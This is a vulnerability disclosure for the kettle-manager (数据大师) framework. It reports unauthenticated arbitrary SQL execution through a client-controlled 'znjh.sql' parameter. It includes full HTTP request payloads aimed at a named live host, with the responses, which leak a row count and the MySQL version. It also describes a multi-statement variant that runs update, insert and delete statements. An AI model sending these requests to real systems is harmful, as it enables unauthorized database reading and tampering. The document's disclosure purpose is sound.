# kettle-manager (数据大师) — Arbitrary SQL execution via client-controlled `znjh.sql`

## Introduction

The select flow of kettle-manager (数据大师, cn.benma666, closed-source commercial framework) directly adopts the client-supplied `znjh.sql` parameter as the SQL to execute: `DefaultLjq.getSql`（DefaultLjq.java:946-952）`if (Cllx.select.name().equals(cllx) && !isBlank(myParams.znjh().getSql())) { sql = myParams.znjh().getSql(); }`；`selectDb`（DefaultLjq.java:1389-1406）splits `arr[1].split(";")` — **statements before the last run as UPDATE, the last one is queried and echoed back**, `;ds=` switches the datasource, and `orderBy` is client-controlled without filtering. [decompiled evidence] The `znjh.sql` mechanism is designed for cross-application sync ("smart exchange"), but the receiving end performs zero trust validation.

## Affected versions

kettle-manager framework current (closed-source; demo shell open-source)

## Utilize conditions

- `/default` endpoint reachable (combined with the sqm- passwordless identity from the companion finding — fully unauthenticated)
- No real credentials required

---

## Vulnerability Reproduction

**Step 1** — arbitrary read query via `znjh.sql` (row count of the user table, no sensitive content):

```http
POST /sjds-ht/default HTTP/1.1
Host: trimdata.cn:2001
Content-Type: application/json
Content-Length: 144

{"sjdx":{"dxdm":"SYS_QX_QTQX"},"sys":{"cllx":"select","userInfo":"sqm-sys","token":"t1"},
 "znjh":{"sql":"select count(*) as c from sys_qx_yhxx"}}
```

Response  — the client-chosen SQL is executed against any table:

![image-20260825084815873](https://github.com/fangtang7/picx-images-hosting/raw/master/kettle/image-20260825084815873.5trrh8xs4z.webp)

```json
{"msg":"数据库查询成功","dateType":"application/json","code":200,"data":{"list":[{"c":6}],
 "listRequired":true,"orderBy":"","pageNumber":1,"pageSize":10,"totalPage":1,
 "totalRequired":true,"totalRow":6},"qqid":"4D5A4C27007C40A3BDC3698A7545348C","status":true}
```

**Step 2** — database version disclosure (error-based, read-only `select version()`):

```http
POST /sjds-ht/default HTTP/1.1
Host: trimdata.cn:2001
Content-Type: application/json

{"sjdx":{"dxdm":"SYS_QX_QTQX"},"sys":{"cllx":"select","userInfo":"sqm-sys","token":"t1"},
 "znjh":{"sql":"select version() as v"}}
```

Response — the version is leaked in the error message:

![image-20260825084755488](https://github.com/fangtang7/picx-images-hosting/raw/master/kettle/image-20260825084755488.7q13dwut0.webp)

```json
{"msg":"执行失败-事务：select->sql:select version() as v,Cannot determine value type from string '8.0.43'","code":500,"status":false}
```

Database version **MySQL 8.0.43** disclosed via error-based reflection; the schema name `sjsj2_zs` leaks the same way. Multi-statement variant: `znjh.sql` with `;` separators runs leading `update/insert/delete` statements (no echo) and echoes the last `select` 

code:

![image-20260825085038662](https://github.com/fangtang7/picx-images-hosting/raw/master/kettle/image-20260825085038662.86udygcafj.webp)

![image-20260825085148038](https://github.com/fangtang7/picx-images-hosting/raw/master/kettle/image-20260825085148038.1lck7f8jz4.webp)
